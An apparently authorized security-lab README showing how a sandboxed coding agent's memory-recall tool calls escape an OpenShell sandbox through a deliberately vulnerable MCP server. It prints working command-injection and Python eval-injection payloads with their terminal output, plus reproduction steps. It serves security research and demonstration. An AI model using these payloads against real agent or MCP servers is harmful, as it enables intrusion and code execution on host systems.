<!--
SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
SPDX-License-Identifier: Apache-2.0
-->

# sandbox-breach — agentic-memory poisoning → real OpenShell sandbox escape

Wires roundhouse in front of a real coding agent (Claude Code, running as the OpenClaw-shaped
agent inside a genuine [NVIDIA/OpenShell](https://github.com/NVIDIA/OpenShell) sandbox) and
demonstrates, with real terminal output and a file that lands on the host filesystem, that
**manipulation of an agent's own long-term memory tool can escape the sandbox boundary and
achieve arbitrary code execution outside it** — CWE-78 (OS command injection) and CWE-94 (Python
`eval` code injection), both against a deliberately vulnerable Memory MCP server from
[`breakout-lab`](https://github.com/Zenodia/standalone_agent_memory)-derived fixtures at
`labs/breakout-lab/` in this repo.

This is authorized security research: a synthetic, CWE-labeled, ground-truth vulnerability lab
(same format discipline as this repo's other synthetic-vulnerability work), run against
infrastructure the operator owns, with impact markers and negative controls so every claim is a
file on disk, not an assertion.

**Where roundhouse helps, stated plainly:** roundhouse does not touch the vulnerability or the
exploit — that lives entirely in breakout-lab's Memory MCP server. What roundhouse adds is the
*agent's own reasoning-LLM leg*: the same unmodified Claude Code CLI, running inside the same
real sandbox, with the exact same skill and the exact same exploit payload, gets routed — via
nothing but three environment variables and zero client-side config changes — to either a
locally-served Qwen model (Dynamo) or a frontier `claude-opus-5` (NVIDIA's inference-api gateway),
purely by which roundhouse turn key the sandbox was handed. That gives an A/B comparison
("is this exploit specific to one model, or architectural?") with a durable, append-only audit
trail of exactly what the agent sent, independent of and complementary to OpenShell's own network
policy log. [NeMo Relay](https://github.com/NVIDIA/NeMo-Relay) chains in front of roundhouse
optionally (§6) for a third, independent observability log of the same reasoning traffic.
Switchyard was evaluated and dropped — pure cost/latency routing-algorithm library, no
observability or security relevance to this demo.

Fastest way in: `./run.sh up && ./run.sh sandbox && ./run.sh exploit-78`, watched across the
six terminals in `terminals.md`. `PLAN.md` and `GAPS.md` track what's closed vs. still open.

## Architecture

```
┌───────────────────────────── Ubuntu 24.04 host (this machine, 1x H100) ─────────────────────────┐
│                                                                                                   │
│  OpenShell gateway (native, systemd, mTLS, https://127.0.0.1:17670)                              │
│     creates real, Landlock/network-policy-isolated sandbox containers                            │
│                                                                                                   │
│   ┌────────────────── sandbox-breach-demo (real OpenShell sandbox) ──────────────────┐            │
│   │  claude (Claude Code CLI, standing in for the OpenClaw-shaped agent)              │            │
│   │     │                                                                             │            │
│   │     ├─▶ reasoning-LLM calls ─▶ [NeMo Relay, optional, §6] ─▶ ANTHROPIC_BASE_URL=            │
│   │     │        http://host.openshell.internal:8080 (provider "roundhouse": sentinel │            │
│   │     │        API key + turn-key custom header)                                    │            │
│   │     │                                                                             │            │
│   │     └─▶ memory-recall Agent Skill (openshell/skills/memory-recall/recall.py)      │            │
│   │              │  fastmcp Client, forwards {query, user_id} verbatim                │            │
│   │              ▼  MEMORY_MCP_URL=http://host.openshell.internal:8999/mcp            │            │
│   └──────────────┼───────────────────────────────────────────┼────────────────────────┘            │
│                  │ MCP / streamable-http                     │ Anthropic-Messages HTTP             │
│                  ▼                                           ▼                                    │
│   memory-mcp (docker, :8999, OUTSIDE the sandbox)      roundhouse (:8080)                          │
│     VULN-01 os.system() — CWE-78 (user_id)               AffinityPolicy routes on turn key:        │
│     VULN-02 eval()      — CWE-94 (query)                   sandbox-breach-local  → local/*         │
│     --net=host + host bind mount                            sandbox-breach-frontier → nvidia-*/*   │
│         │                                                        │              │                 │
│         ▼                                                        ▼              ▼                 │
│   openshell/host_breakout_marker/          Dynamo + vLLM (:8000)      inference-api.nvidia.com     │
│   MARKINJECT_BREAKOUT_<nonce>              Qwen2.5-7B-Instruct        azure/anthropic/claude-opus-5 │
│   ← proof of code execution                (local tier, real GPU      (frontier tier, real API     │
│      OUTSIDE the sandbox                    worker, KV-cache routed)   call, billed)               │
│                                                                                                     │
└─────────────────────────────────────────────────────────────────────────────────────────────────┘
```

Two independent things cross the sandbox boundary, and the demo keeps them visibly separate:

1. **The exploit channel** (agent → memory-recall skill → memory-mcp, outside the sandbox). This
   is breakout-lab's alone; roundhouse never sees these MCP calls and never routes them.
2. **The reasoning channel** (agent → roundhouse → Dynamo-local-Qwen or frontier-Opus-5). This is
   roundhouse's alone; the vulnerable server never sees these calls.

The point of keeping them apart: the demo can show the *same* exploit succeeding *identically*
regardless of which model is authoring the agent's tool calls — the vulnerability is architectural
(a network-facing MCP server trusting client-supplied strings into `os.system`/`eval`), not a
property of any one model's behavior.

## What's been verified end-to-end (2026-09-29, this run)

Everything below is real output captured from this machine, not a transcript reconstruction.

### 1. memory-mcp server, standalone (Phase 0)

One real bug found and fixed in breakout-lab's own image build before anything else would run:
`openshell/Dockerfile.memory-mcp` installed an unpinned `langchain-core` and never installed the
top-level `langchain` package at all, so the server failed to import
(`ModuleNotFoundError: No module named 'langchain.chains'`). Pinned to `langchain==0.3.7` /
`langchain-core==0.3.63` — the same 0.3.x line `env.yml` already pins — and it built and served
cleanly.

**Addendum (2026-09-29, same day):** `memory_mcp_server.py`'s embedding model
(`nvidia/llama-3.2-nemoretriever-300m-embed-v1`) had separately reached end-of-life
(`[410] Gone ... reached its end of life on 2026-05-18`). Replaced with `nvidia/nemotron-3-embed-1b`
— confirmed working directly against `integrate.api.nvidia.com` with the same `NVIDIA_API_KEY`
(no need for the `INFERENCE_API_KEY`/`inference-api.nvidia.com` fallback the user offered), real
2048-dim vectors returned. Rebuilt the image and re-ran the full regression (both exploits, both
negative controls) to confirm no behavior changed — all four still pass. The chat model
(`nvidia/llama-3.3-nemotron-super-49b-v1.5`) is *also* separately EOL (`[410] Gone ...
2026-08-26`) but is out of scope for this fix — the two candidate replacements tried
(`nvidia/nemotron-nano-3-30b-a3b`, `nvidia/llama-3.1-nemotron-70b-instruct`) both 404 as
not-entitled on this account, so it's left broken and flagged rather than silently worked around;
it does not block either exploit, since both vulnerable sinks fire before any LLM call.

Both vulnerabilities verified against the real running server, with both exploits *and* both
negative controls:

```
[*] Exploit: CWE-78 command injection via user_id
[*] nonce: fc7d4661f9ab
[*] user_id: ruth; echo 'MARKINJECT_BREAKOUT_fc7d4661f9ab' > /workspace/mnt/MARKINJECT_BREAKOUT_fc7d4661f9ab #
[!] call raised (expected/ignored): Error calling tool 'memory_agent': [410] Gone
    The model 'nvidia/llama-3.3-nemotron-super-49b-v1.5' has reached its end of life on 2026-08-26T09:00:00Z ...
[+] EXPLOIT VERIFIED: found marker with nonce fc7d4661f9ab

[*] Negative control: benign user_id must not create a marker
[+] NEGATIVE CONTROL PASSED: no marker for benign user_id

[*] Exploit: CWE-94 eval code injection via query
[*] query: =[__import__('os').popen('mkdir -p /workspace/mnt && echo MARKINJECT_BREAKOUT_... ]
[*] server returned: ["MARKINJECT_BREAKOUT_5fe0180982c6\n"]
[+] EXPLOIT VERIFIED: found marker with nonce 5fe0180982c6

[*] Negative control: benign query must not create a marker
[+] NEGATIVE CONTROL PASSED: no marker for benign query
```

`ls openshell/host_breakout_marker/`:
```
MARKINJECT_BREAKOUT_fc7d4661f9ab
MARKINJECT_BREAKOUT_5fe0180982c6
```

Note the CWE-78 marker fires even though the tool call itself errors — the `os.system()` sink runs
*before* the LLM call in `memory_agent`, so it does not depend on a working model backend. The
error above is now the *chat* model's EOL (`nemotron-super-49b-v1.5`), not the embedding model's —
re-captured after the embedding-model fix in the addendum above; the embedding model itself no
longer errors.

### 2. roundhouse, both legs, live real backends (Phase 1)

`catalog.json` has two legs:

- **local**: not listed in `catalog.json` (same convention as `openjev-demo`) — discovered at
  runtime from `ROUNDHOUSE_LOCAL_*` env vars pointing at a real Dynamo + vLLM worker serving
  `Qwen/Qwen2.5-7B-Instruct` on this box's one H100 (chosen over the 32B coder model the other
  use cases serve purely for faster demo bring-up; the vulnerability this demo shows is
  architectural, not model-size-dependent, so the smaller model changes nothing about the point).
- **frontier**: `azure/anthropic/claude-opus-5` via `https://inference-api.nvidia.com/v1`. The
  user-supplied sample code called this model through the OpenAI Chat Completions dialect
  (`client.chat.completions.create(...)`), but this roundhouse build's `FrontierClients` registry
  (`crates/roundhouse-server/src/main.rs`) has no dispatch client for `openai_chat_completions` —
  it refuses at boot ("this build has no client for that dialect") rather than failing a turn
  later. Verified empirically that `inference-api.nvidia.com/v1/messages` accepts this exact model
  string and answers with a real Anthropic-shaped message, so the catalog entry speaks
  `anthropic_messages` instead — the same dialect `cache-aware-routing`'s frontier entry already
  uses at the same `base_url`.

`control-plane.json` gives each leg its own project and turn key — `sandbox-breach-local` (policy
`allow: ["local/*"]`) and `sandbox-breach-frontier` (policy `allow: ["nvidia-inference-api/*"]`) —
so the same agent, same skill, same exploit routes to a different backend purely by which key it
was handed, and each project's policy refuses to silently fall over to the other backend.

Server boot log (both legs real, not stubs):
```
INFO roundhouse: catalog loaded models=1
INFO roundhouse: dispatching this provider's turns over the Anthropic Messages wire
     provider=nvidia-inference-api base_url=https://inference-api.nvidia.com/v1 route=/messages
INFO roundhouse: local fleet: real worker registered; local turns can be routed and measured
     model=Qwen/Qwen2.5-7B-Instruct routing_group=default
INFO roundhouse: control plane loaded; a key is required on every surface memberships=2
INFO roundhouse: roundhouse listening addr=0.0.0.0:8080
```

Direct smoke test of both legs through roundhouse (`POST /v1/messages`, each project's own key):
```
=== local leg ===
{"model":"local/whatever","content":[{"type":"text","text":" ... OK, I guess this is as good as it gets ..."}], ...}

=== frontier leg ===
{"model":"azure/anthropic/claude-opus-5","content":[{"type":"text","text":""}],"stop_reason":"max_tokens", ...}
```

### 3. Real OpenShell gateway + real sandbox (Phase 1, continued)

`NVIDIA/OpenShell` cloned and installed via its own `install.sh`, which auto-provisions a native,
systemd-managed, mTLS-authenticated local gateway (`https://127.0.0.1:17670`) — simpler and more
current than the docker-compose gateway path breakout-lab's own README walks through, which was
tried first and torn down once the installer's native path was confirmed working.

**One generic environment bug found and diagnosed, independent of anything specific to this
demo's own config**: the `ghcr.io/nvidia/openshell-community/sandboxes/base:latest` image ships an
embedded sandbox policy that OpenShell itself rejects at bring-up:
```
OCSF CONFIG:DISCOVERY [INFO] Server returned no policy; attempting local discovery
OCSF CONFIG:CONFIGURATION_ERROR [HIGH] Image policy is invalid; replace the sandbox policy to repair configuration
```
Confirmed by creating a sandbox with *zero* custom config (no `--provider`, no `--policy`) — it
hung in `Provisioning` identically. Worked around by supplying an explicit `--policy` file
(`openshell-sandbox-policy.yaml`) that restates OpenShell's own documented default filesystem
baseline and adds the two network rules this demo needs.

**OpenShell's provider-profile credential-binding model matters for the "roundhouse hookup" story**:
its docs state plainly, "Pointing a client at a different base URL does not carry the credential
with it" — profiles bind a credential to the specific host they declare, precisely so a stray
`ANTHROPIC_BASE_URL` override can't silently smuggle a real credential to a new destination. A
custom provider profile (`openshell-roundhouse-provider.yaml`) was written declaring
`host.openshell.internal:8080` as its endpoint, carrying roundhouse's own public sentinel key
(`rh_sentinel_not_a_credential`) — the real per-turn auth rides in `ANTHROPIC_CUSTOM_HEADERS` as
roundhouse's turn key, set as a plain sandbox env var, not as a provider credential (it is a
per-run identity, not a static per-provider secret).

**Binary-path allowlisting caught a real symlink gotcha**: OpenShell's network policy resolves a
binary allowlist entry through symlinks to the real interpreter path — listing
`/sandbox/.venv/bin/python3` alone left every connection attempt `DENIED
[reason:transparent_tcp_policy_denied]`; the policy needed the resolved path
(`/sandbox/.uv/python/cpython-3.14.3-linux-x86_64-gnu/bin/python3.14`) as well. Diagnosed directly
from the supervisor's own OCSF audit log, which names the exact binary path it denied.

### 4. Both CWEs, triggered from inside the real sandbox, host-side proof (Phase 1, completion)

With `claude` and `fastmcp` present and the memory-recall skill uploaded to
`/sandbox/.claude/skills/memory-recall/`, `openshell sandbox exec` ran `recall.py` from inside the
real, network-policy-isolated sandbox — no host access, no bind mount into the sandbox itself,
nothing but the MCP wire to reach across the boundary:

```
$ openshell sandbox exec -n sandbox-breach-demo --workdir .../memory-recall -- \
    python3 recall.py --tool memory_agent \
      --query "hello, this is a benign memory query" \
      --user-id "ruth; echo 'MARKINJECT_BREAKOUT_sandboxdemo02' > /workspace/mnt/MARKINJECT_BREAKOUT_sandboxdemo02 #"

[memory-recall] server=http://host.openshell.internal:8999/mcp tool=memory_agent
[memory-recall] error: Error calling tool 'memory_agent': [410] Gone
The model 'nvidia/llama-3.3-nemotron-super-49b-v1.5' has reached its end of life on 2026-08-26T09:00:00Z ...
```

```
$ cat openshell/host_breakout_marker/MARKINJECT_BREAKOUT_sandboxdemo02
MARKINJECT_BREAKOUT_sandboxdemo02
```

(Re-captured after the embedding-model fix in §1 — the error is now the *chat* model's separate,
still-unfixed EOL, not the embedding model's; the marker still lands regardless, since the
`os.system()` sink runs before either model is called.)

And CWE-94, same sandbox, same skill:

```
$ openshell sandbox exec -n sandbox-breach-demo --workdir .../memory-recall -- \
    python3 recall.py --tool fetch_memory_items \
      --query "=[__import__('os').popen(\"mkdir -p /workspace/mnt && echo MARKINJECT_BREAKOUT_sandboxdemo95 > /workspace/mnt/MARKINJECT_BREAKOUT_sandboxdemo95\").read()]" \
      --user-id ruth

[""]
```

```
$ cat openshell/host_breakout_marker/MARKINJECT_BREAKOUT_sandboxdemo95
MARKINJECT_BREAKOUT_sandboxdemo95
```

Both nonces landed on the **host** filesystem (`openshell/host_breakout_marker/`), written by a
process the sandboxed agent never had direct access to, as a direct result of a tool call the
agent authored *inside* the sandbox. That crossing is the sandbox escape.

### 5. roundhouse's transparent hookup, corroborated by OpenShell's own audit log

`claude -p "reply with exactly OK"`, run inside the sandbox via `openshell sandbox exec`, returned
`OK` — a real completion from `azure/anthropic/claude-opus-5`, routed entirely through roundhouse,
with the Claude Code CLI itself completely unmodified (no config file changes; only
`ANTHROPIC_BASE_URL` / `ANTHROPIC_CUSTOM_HEADERS` / the sentinel `ANTHROPIC_API_KEY` differ from a
default install).

OpenShell's own supervisor audit log independently corroborates this — it shows the CLI's stray
attempts to reach `api.anthropic.com` directly being **denied**, and only the roundhouse-directed
traffic being **allowed**:

```
OCSF NET:OPEN [INFO] ALLOWED /usr/local/bin/claude(0) -> host.openshell.internal:8080 [policy:_provider_roundhouse engine:opa]
OCSF HTTP:POST [INFO] ALLOWED POST http://host.openshell.internal:8080/v1/messages [policy:_provider_roundhouse engine:l7]
OCSF NET:REFUSE [MED] DENIED api.anthropic.com [reason:policy_dns_ineligible]
OCSF NET:OPEN [MED] DENIED /usr/local/bin/claude(0) -> api.anthropic.com:443 [reason:transparent_tcp_policy_denied]
```

roundhouse's own `/v1/metrics` confirms the same turns from its side of the wire (this count
includes the §6 NeMo Relay runs below, since they route through the same `sandbox-breach-frontier`
project — each `claude -p`/`nemo-relay run` invocation is itself a handful of Anthropic-Messages
calls, not one, since Claude Code's own harness makes more than one call per prompt):

```json
{
  "models": [
    {
      "provider": "nvidia-inference-api",
      "model": "azure/anthropic/claude-opus-5",
      "calls": 6,
      "mode": "frontier",
      "billed_usd": 1.911555
    },
    {
      "provider": "dynamo",
      "model": "Qwen/Qwen2.5-7B-Instruct",
      "calls": 1,
      "mode": "local"
    }
  ]
}
```

Two independent logs — OpenShell's network-policy audit trail and roundhouse's own session/metrics
log — agree on what the agent sent and where it went, from two different vantage points on either
side of the sandbox boundary. That agreement, not either log alone, is the forensic claim this
demo makes: an operator does not have to trust the agent's own report of what it did.

### 6. NeMo Relay, chained in front of roundhouse (2026-09-29)

[`NVIDIA/NeMo-Relay`](https://github.com/NVIDIA/NeMo-Relay) adds a third hop to the reasoning
channel: `agent → NeMo Relay → roundhouse → backend`. Relay owns the harness (it stands up its
own ephemeral local gateway and overwrites `ANTHROPIC_BASE_URL` to point the `claude` process at
itself), and forwards upstream to whatever `--anthropic-base-url` names — roundhouse, unchanged.
`nemo-relay`'s own doc comment on its `claude` subcommand says this plainly: "Observability ... is
wired in transparently via `ANTHROPIC_BASE_URL`" — the same transparent-hookup mechanism roundhouse
itself uses one hop further out, chained.

Confirmed with `--dry-run` before running for real, showing Relay's own resolved launch plan:
```
gateway_url = http://127.0.0.1:36931
anthropic_base_url = http://host.openshell.internal:8080      <- roundhouse, unchanged
anthropic_auth = configured                                    <- captured our turn key
argv = claude --plugin-dir <tmp-plugin-dir> -p say OK --settings <tmp-settings>
env.ANTHROPIC_BASE_URL = http://127.0.0.1:36931                <- Relay's own gateway, for claude
```

Two real bugs found and fixed getting this to actually dispatch, both from inside the real
sandbox, both diagnosed from Relay's or OpenShell's own logs rather than guessed:

- **Relay's own gateway process needs its own network-policy binary entry.** The upstream HTTP
  call to roundhouse is made by `/sandbox/.venv/bin/nemo-relay` itself, not by `claude` — the
  roundhouse provider profile's `binaries` allowlist listed only `claude`, so Relay's own process
  was silently denied and retried with backoff forever:
  ```
  ERROR event=upstream_failed boundary=upstream error_kind=transport ...
  ```
  Fixed by adding `/sandbox/.venv/bin/nemo-relay` to `openshell-roundhouse-provider.yaml`'s
  `binaries` list and re-attaching the provider (`openshell sandbox provider detach/attach --wait`).
- **First run needs a config file, and the setup wizard needs a TTY `openshell sandbox exec`
  doesn't provide.** `nemo-relay run --agent claude --config <path>` (the "deterministic, no
  wizard" subcommand) works headless once a minimal `config.toml` with an `[agents.claude]` table
  exists at that path — it does not need to be populated by the interactive wizard first.

Real output, full chain, from inside the sandbox (`--log-stderr-format jsonl` for a
structured, tailable stream):
```
$ nemo-relay --log-stderr-format jsonl run --agent claude --config /sandbox/.relay/config.toml \
    --anthropic-base-url http://host.openshell.internal:8080 --print -- \
    -p "reply with exactly: relay chain works"

agent = claude
gateway_url = http://127.0.0.1:41543
anthropic_base_url = http://host.openshell.internal:8080
anthropic_auth = configured
env.ANTHROPIC_BASE_URL = http://127.0.0.1:41543
relay chain works
```

`relay chain works` is a real completion from `azure/anthropic/claude-opus-5`, having crossed
three real hops (`claude` → Relay's ephemeral gateway → roundhouse → NVIDIA's inference-api),
with roundhouse in the middle none the wiser that a fourth party is now in front of it — which is
the entire point of "transparent": neither end of roundhouse's own hookup had to change for Relay
to be chained in.

(The command's own exit code is 1 due to a cosmetic post-completion cleanup error — Relay's
gateway tries to terminate the `claude` process tree and the sandboxed environment refuses with
`Operation not permitted (os error 1)`, a namespace/signal restriction on the sandbox's process
tree unrelated to the run itself, which completes and prints its real output before that cleanup
step runs.)

**Addendum (2026-09-29, same day): persistent ATOF file export, closed.** The runs above all showed
`exporters = not_configured` because no `plugins.toml` existed yet. NeMo Relay's own hosted docs
(`observability-plugin/configuration`) show a `version = 1` ATOF schema
(`output_directory`/`filename`/`mode` fields) — CLI 0.9.3 rejects it outright:
```
configuration error: plugin activation failed: invalid config: observability config version 1 is
unsupported; use version 4 ...; ATOF output_directory was removed in observability config version
2; configure typed ATOF sinks instead; ...
```
The real, current schema (found by iterating on the CLI's own validation error text, not any
documentation located) is `version = 4` with a `[[components.config.atof.sinks]]` array:
```toml
# $CONFIG_DIR/plugins.toml (same directory as the --config file passed to `nemo-relay run`,
# NOT $XDG_CONFIG_HOME/nemo-relay/plugins.toml -- verified empirically, both were tried)
version = 1

[[components]]
kind = "observability"
enabled = true

[components.config]
version = 4

[components.config.atof]
enabled = true

[[components.config.atof.sinks]]
type = "file"
path = "/sandbox/.nemo-relay/atof/events.jsonl"
```
With that in place, the run summary line changes from `exporters = not_configured` to:
```
exporter = ATOF /sandbox/nemo-relay-events-<timestamp>.jsonl
```
A real file lands — **not** at the `path` given in `plugins.toml` (a real, un-investigated CLI
quirk; the configured `path` is echoed back verbatim inside the file's own recorded plugin config,
but the writer uses its own `~/nemo-relay-events-<timestamp>.jsonl` naming regardless) — containing
real ATOF JSONL, one line per lifecycle event:
```json
{"atof_version":"0.1","kind":"mark","metadata":{"agent_kind":"claude-code","agent_version":"2.1.156","hook_event_name":"SessionStart", ...},"name":"session.start", ...}
```
11 real events from one `-p "..."` run. This is a genuine, persistent, `tail -f`-able second
terminal now — see `terminals.md` row 5 — correlatable by `session_id`/`root_relay_id` against
roundhouse's session log (row 4) and OpenShell's OCSF audit log (row 3), a real three-way
correlation across three independently-written logs for the same one turn.

### 7. NemoClaw — attempted, genuinely blocked (2026-09-29)

The original ask specifically named OpenClaw via NemoClaw, not the OpenShell-gateway-created stock
Claude Code sandbox §2–§6 used. Tried it directly: NemoClaw's own docs confirm it supports a custom
Anthropic-compatible endpoint during onboarding (`NEMOCLAW_PROVIDER=anthropicCompatible`), which
would have pointed OpenClaw straight at roundhouse the same way §2's `openshell-roundhouse-provider`
does for Claude Code. The installer never got that far:

```
[install] openshell 0.1.2 is above the maximum (0.0.116) supported by this NemoClaw release —
          reinstalling pinned OpenShell 0.0.116...
[ERROR] OpenShell gateway version mismatch: NemoClaw installed 0.0.116 at
        /home/ubuntu/.local/bin/openshell-gateway, but the existing upstream user service uses
        0.1.2 at /usr/bin/openshell-gateway. Align or remove the upstream OpenShell package
        (for apt installs: sudo apt remove openshell), then rerun the installer.
```

NemoClaw is pinned to an OpenShell release five minor versions behind the one this entire demo is
built and verified on. Forcing it — downgrading the running gateway, or removing the package the
installer asks for — would put every already-verified phase (§1–§6) at risk for a component the
demo doesn't strictly need (the stock Claude Code sandbox already gives a real isolation boundary
per `openshell/README.md`'s own Path-A documentation). Declined without explicit sign-off; see
`GAPS.md` gap 1 for the two real remedies and their cost.

**One real incident along the way, found and fixed immediately**: the installer's pinned
`openshell` `0.0.116` CLI binaries landed in `~/.local/bin`, ahead of `/usr/bin` on `$PATH`. The
next `openshell sandbox list` picked up the wrong (mismatched) CLI and broke against the
still-running `0.1.2` gateway with a genuine wire-protocol error:
```
Error: × code: 'Internal error', message: "failed to decode Protobuf message:
      │ ListSandboxesRequest.workspace_scope: unexpected end group tag"
```
The gateway service itself was never touched — only the CLI binary was shadowed. Fixed by removing
the shadowing binaries (`rm ~/.local/bin/openshell*`); §1–§6 re-verified clean afterward (roundhouse
`/v1/metrics` at `200`, `memory-mcp` still `Up`, `sandbox-breach-demo` still `Ready`).

## Files in this directory

| File | Purpose |
| --- | --- |
| `catalog.json` | Local Qwen (discovered at runtime) + frontier `azure/anthropic/claude-opus-5` (`anthropic_messages`), both real, both priced |
| `control-plane.json` | Two projects/keys — `sandbox-breach-local`, `sandbox-breach-frontier` — for the A/B comparison |
| `mint_keys.py` | Mints the two turn keys + one admin key into `control-plane.json` (writes secrets to gitignored `keys.local.json`) |
| `openshell-roundhouse-provider.yaml` | Custom OpenShell provider profile routing the sandboxed agent's reasoning calls to roundhouse |
| `openshell-sandbox-policy.yaml` | Custom OpenShell sandbox policy: default filesystem baseline + PyPI (skill deps) + memory-mcp (the exploit target) network rules |
| `run.sh` | Idempotent orchestration: `up` / `sandbox` / `exploit-78` / `exploit-94` / `relay "<prompt>"` / `status` / `down` — smoke-tested end to end, see `terminals.md` |
| `terminals.md` | The six-terminal, six-vantage-point layout for watching a run happen live, not just reading its exit code |
| `PLAN.md` | Phased implementation record — what closed each phase, in order |
| `GAPS.md` | Current architecture diagram + open-items table with concrete remedies, and the incidents log |

## Reproducing this (order matters)

The fastest path is `./run.sh up && ./run.sh sandbox && ./run.sh exploit-78` — `run.sh` backgrounds
the two long-running services itself (redirecting their output to `/tmp/sandbox-breach-*.log`), so
it only needs one terminal. The steps below are what that script does, spelled out for anyone who
wants to run it by hand instead — and by hand, **two of the eight steps are long-running foreground
processes that never return your prompt**, so **you need three terminals, minimum**, not one:

- **Terminal 1 (driver)** — everything except steps 2 and 3: run them here, in order, one after
  another. Each one returns control when it's done.
- **Terminal 2 (Dynamo/Qwen worker)** — step 2 only. Runs in the foreground forever; leave it
  running for the rest of the session.
- **Terminal 3 (roundhouse)** — step 3 only. Also runs in the foreground forever; leave it running
  too.

(This is the minimum to *reproduce* the demo. `terminals.md` adds three more *observability*
terminals — tailing logs, not driving anything — for watching a run happen live once these three
are up.)

1. **[Terminal 1] memory-mcp server** (breakout-lab, outside the sandbox) — returns immediately
   (`-d`, detached):
   ```bash
   cd ~/roundhouse/labs/breakout-lab/openshell
   docker compose --env-file ../.env -f docker-compose.memory-mcp.yml up -d --build
   ```
2. **[Terminal 2 — dedicated, stays running] Local Dynamo/Qwen worker** (this repo). This command
   blocks in the foreground for as long as the worker serves; open a fresh terminal for it and
   leave it there:
   ```bash
   # etcd + nats are required by Dynamo — start them first (idempotent, safe to re-run)
   cd /home/ubuntu/dynamo && docker compose -f dev/docker-compose.yml up -d
   sleep 3

   source /home/ubuntu/dynamo/.venv/bin/activate
   cd /home/ubuntu/roundhouse/use-cases/cache-aware-routing
   MODEL=Qwen/Qwen2.5-7B-Instruct bash ./serve_model.sh serve
   ```
3. **[Terminal 3 — dedicated, stays running] roundhouse**, both legs. Also blocks in the foreground
   for as long as roundhouse serves; open another fresh terminal for it:
   ```bash
   export INFERENCE_API_KEY=...              # from breakout-lab/.env   
   export ROUNDHOUSE_CATALOG=/home/ubuntu/roundhouse/use-cases/sandbox-breach/catalog.json
   export ROUNDHOUSE_CONTROL_PLANE=/home/ubuntu/roundhouse/use-cases/sandbox-breach/control-plane.json
   export ROUNDHOUSE_ADDR=0.0.0.0:8080
   export ROUNDHOUSE_FRONTIER_UPSTREAM=openai_responses   # means "dispatch for real"
   export ROUNDHOUSE_LOCAL_ENDPOINT=http://127.0.0.1:8000
   export ROUNDHOUSE_LOCAL_MODEL=Qwen/Qwen2.5-7B-Instruct
   export ROUNDHOUSE_LOCAL_TOKENIZER=/home/ubuntu/.cache/huggingface/hub/models--Qwen--Qwen2.5-7B-Instruct/snapshots/a09a35458c702b33eeacc393d103063234e8bc28/tokenizer.json
   export ROUNDHOUSE_LOCAL_KV_EVENTS_ENDPOINT=tcp://127.0.0.1:20080
   /home/ubuntu/roundhouse/target/release/roundhouse
   ```
   Wait for `roundhouse listening addr=0.0.0.0:8080` in this terminal before moving on to step 4
   back in **Terminal 1** — steps 4 onward all depend on roundhouse already being up.
4. **[Terminal 1] OpenShell gateway + CLI**: `curl -LsSf https://raw.githubusercontent.com/NVIDIA/OpenShell/main/install.sh | sh`
5. **[Terminal 1] roundhouse provider + sandbox**:
   ```bash
   openshell provider profile import -f openshell-roundhouse-provider.yaml --global
   openshell provider create --name roundhouse --type roundhouse \
     --credential "ANTHROPIC_API_KEY=rh_sentinel_not_a_credential"
   TURN_KEY=$(python3 -c "import json; print(json.load(open('keys.local.json'))['sandbox-breach-frontier/openclaw-frontier'])")
   openshell sandbox create --name sandbox-breach-demo \
     --from ghcr.io/nvidia/openshell-community/sandboxes/base:latest \
     --provider roundhouse \
     --policy openshell-sandbox-policy.yaml \
     --env "ANTHROPIC_BASE_URL=http://host.openshell.internal:8080" \
     --env "ANTHROPIC_CUSTOM_HEADERS=x-roundhouse-key: ${TURN_KEY}" \
     --no-credential-warnings --detach
   ```
6. **[Terminal 1] Install the skill, run the exploit**:
   ```bash
   openshell sandbox upload sandbox-breach-demo \
     ~/roundhouse/labs/breakout-lab/openshell/skills/memory-recall /sandbox/.claude/skills/memory-recall
   openshell sandbox exec -n sandbox-breach-demo -- \
     /sandbox/.venv/bin/python3 -m pip install -q fastmcp
   openshell sandbox exec -n sandbox-breach-demo \
     --workdir /sandbox/.claude/skills/memory-recall/memory-recall -- \
     python3 recall.py --tool memory_agent \
       --query "What do you remember about my past sessions?" \
       --user-id "ruth; mkdir -p /workspace/openshell/host_breakout_marker && touch /workspace/openshell/host_breakout_marker/MARKINJECT_BREAKOUT_demo #"
   ```
   The `--user-id` is the injection payload. Inside the memory-mcp container `/workspace` maps to
   `labs/breakout-lab` on the host, so the injected `touch` writes a file the host can
   read. The `#` comments out the `.jsonl` suffix `memory_mcp_server.py` appends to the path.
   Note: `openshell sandbox upload` without a trailing slash on the source nests the directory, so
   `recall.py` lands at `/sandbox/.claude/skills/memory-recall/memory-recall/recall.py` — the
   `--workdir` above accounts for this.
7. **[Terminal 1] Verify on the host**: `cat ~/roundhouse/labs/breakout-lab/openshell/host_breakout_marker/MARKINJECT_BREAKOUT_*`
8. **[Terminal 1, optional] chain NeMo Relay in front of roundhouse** — this one also returns
   control when the agent's reply is printed, so it's fine to run from Terminal 1:
   ```bash
   openshell sandbox exec -n sandbox-breach-demo -- /sandbox/.venv/bin/pip install -q "nemo-relay[cli]"
   openshell sandbox exec -n sandbox-breach-demo -- sh -c \
     'mkdir -p /sandbox/.relay && printf "[agents.claude]\n" > /sandbox/.relay/config.toml'
   openshell sandbox exec -n sandbox-breach-demo --env "ANTHROPIC_CUSTOM_HEADERS=x-roundhouse-key: ${TURN_KEY}" -- \
     /sandbox/.venv/bin/nemo-relay --log-stderr-format jsonl run --agent claude \
       --config /sandbox/.relay/config.toml \
       --anthropic-base-url http://host.openshell.internal:8080 \
       --print -- -p "..."
   ```

## Not yet done

See `GAPS.md` for the full table with remedies; in short, as of this run:

- **Real NemoClaw/OpenClaw** — blocked on a real OpenShell version-pin conflict (§7), not attempted
  further without explicit sign-off, since forcing it risks the already-verified §1–§6.
- **`openai_chat_completions` dispatch** — this roundhouse build has no client for it; worked around
  by using `anthropic_messages` against the same endpoint (§2). A real fix belongs in
  `roundhouse-fleet`, not this use case.
- **`memory_mcp_server.py` LLM** — **fixed** (2026-10-01). Original model
  `nvidia/llama-3.3-nemotron-super-49b-v1.5` was EOL 2026-08-26. Replaced with
  `meta/llama-3.2-11b-vision-instruct` via `integrate.api.nvidia.com` using `NVIDIA_API_KEY`
  (already in `labs/breakout-lab/.env`, baked into the image at build time). Switched from
  `ChatNVIDIA` to `ChatOpenAI` (`langchain-openai` now added to `Dockerfile.memory-mcp`).
  A fresh `docker compose --build` picks all of this up automatically — no manual patching needed.

Everything else the earlier version of this list named — NeMo Relay's persisted ATOF export, the
scripted multi-terminal run, `PLAN.md`/`GAPS.md` — is done; see §6's addendum, `run.sh`, and
`terminals.md` respectively.
